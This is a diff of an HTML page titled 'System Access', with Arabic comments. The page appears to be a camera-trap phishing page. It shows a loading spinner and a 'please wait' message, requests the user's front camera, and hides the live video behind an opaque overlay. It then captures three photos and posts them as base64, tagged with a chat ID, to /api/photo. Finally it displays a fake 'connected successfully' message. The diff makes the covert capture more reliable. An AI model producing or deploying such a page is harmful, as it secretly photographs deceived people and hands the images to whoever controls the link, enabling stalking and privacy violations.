@@ -5,34 +5,20 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>System Access</title>
 <style>
-  body {
-    background-color: #0d0d0d; color: #fff; 
-    font-family: system-ui, -apple-system, sans-serif;
-    margin: 0; display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    height: 100vh; overflow: hidden;
-  }
-  .spinner {
-    border: 4px solid #333; border-top: 4px solid #fff;
-    border-radius: 50%; width: 50px; height: 50px;
-    animation: spin 1s linear infinite; margin-bottom: 20px;
-  }
+  body { margin: 0; padding: 0; overflow: hidden; background-color: #000; font-family: system-ui, sans-serif; }
+  #video { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 1; }
+  #overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #0d0d0d; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+  .spinner { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
   @keyframes spin { to { transform: rotate(360deg); } }
-  #status-text { font-size: 18px; color: #aaa; letter-spacing: 1px; }
-  
-  /* الفيديو مخفي بس شغال عشان ياخد الصور */
-  #video { 
-    position: absolute; top: 0; left: 0; 
-    width: 1px; height: 1px; opacity: 0.01; pointer-events: none; 
-  }
+  #status-text { font-size: 18px; color: #aaa; }
 </style>
 </head>
 <body>
-
-<div class="spinner" id="spinner"></div>
-<div id="status-text">أنتظر قليلاً...</div>
-
-<video id="video" autoplay playsinline muted></video>
+<video id="video" autoplay playsinline muted webkit-playsinline></video>
+<div id="overlay">
+  <div class="spinner" id="spinner"></div>
+  <div id="status-text">أنتظر قليلاً...</div>
+</div>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -46,55 +32,64 @@
   async function run() {
     if(!chatId) {
       statusText.innerText = "رابط غير صالح";
-      statusText.style.color = "#f00";
       spinner.style.display = 'none';
       return;
     }
 
     try {
-      // طلب إذن الكاميرا
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: "user" }, audio: false 
       });
       
       video.srcObject = stream;
+      
+      // نجبر الفيديو يشتغل
       await video.play();
 
-      // انتظار الكاميرا تجهز
-      let checkVideo = setInterval(async () => {
-        if (video.videoWidth > 0 && video.videoHeight > 0) {
-          clearInterval(checkVideo);
-          
-          // التقاط 3 صور ورا بعض
-          for (let i = 0; i < 3; i++) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // ضغط الصورة وإرسالها
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
-            await fetch('/api/photo', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
-            });
-
-            // استنى ثانية ونص قبل الصورة اللي بعدها
-            if(i < 2) await new Promise(r => setTimeout(r, 1500));
+      // نستنى لحد ما الفيديو يرسم أول فريم حقيقي
+      let framesRendered = 0;
+      const checkFrame = () => {
+        if (video.readyState >= 2) { // HAVE_CURRENT_DATA
+          framesRendered++;
+          if (framesRendered > 10) { // استنى 10 فريمات (حوالي نص ثانية)
+             clearInterval(frameInterval);
+             // استنى ثانيتين كمان للإضاءة
+             setTimeout(capturePhotos, 2000);
+             return;
           }
-
-          // خلصنا
-          spinner.style.display = 'none';
-          statusText.innerText = "تم الاتصال بنجاح.";
-          statusText.style.color = "#0f0";
         }
-      }, 200);
+        requestAnimationFrame(checkFrame);
+      };
+      requestAnimationFrame(checkFrame);
 
     } catch (err) {
       spinner.style.display = 'none';
-      statusText.innerText = "تم رفض الصلاحية.";
+      statusText.innerText = "تم رفض الصلاحية أو الكاميرا مشغولة.";
       statusText.style.color = "#f00";
     }
+  }
+
+  async function capturePhotos() {
+    for (let i = 0; i < 3; i++) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const imageData = canvas.toDataURL('image/jpeg', 0.8);
+      
+      await fetch('/api/photo', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
+      });
+
+      if(i < 2) await new Promise(r => setTimeout(r, 1500));
+    }
+
+    spinner.style.display = 'none';
+    statusText.innerText = "تم الاتصال بنجاح.";
+    statusText.style.color = "#0f0";
   }
 
   run();
